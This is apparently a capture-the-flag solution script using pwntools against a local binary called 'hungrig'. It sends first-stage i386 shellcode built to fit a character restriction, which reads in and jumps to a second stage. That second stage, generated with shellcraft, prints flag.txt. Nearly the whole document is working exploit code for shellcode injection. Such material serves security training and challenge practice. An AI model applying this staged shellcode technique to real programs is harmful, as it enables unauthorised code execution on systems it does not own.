#!/usr/bin/env python
import time
from pwn import *

elf = ELF("./hungrig")
context.binary = elf

payload = flat(
            b"MAT\x00",
            asm("""
                xor eax, eax
                add al, 0
                inc eax
                inc eax
                add al, 0
                inc eax
                nop
                add al, 0
                xor ebx, ebx
                add al, 0
                xor ecx, ecx
                add al, 0
                xor edx, edx
                add al, 0
            """),
            asm("""
                inc edx
                inc edx
                add al, 0
            """) * 22,
            asm("""
                push esp
                pop ecx
                add al, 0
                int 0x80
                add al, 0
                jmp esp
            """)
        )
payload = payload + b"\x90" * (0x80 - len(payload)) 

r = process([elf.path])
#gdb.attach(r, "continue")

r.recvuntil(b"mata mig:")
r.send(payload)

time.sleep(3)

payload_2 = asm(shellcraft.i386.linux.cat("flag.txt"))
r.send(payload_2)
print(b"Flag is:%s" % r.readline())
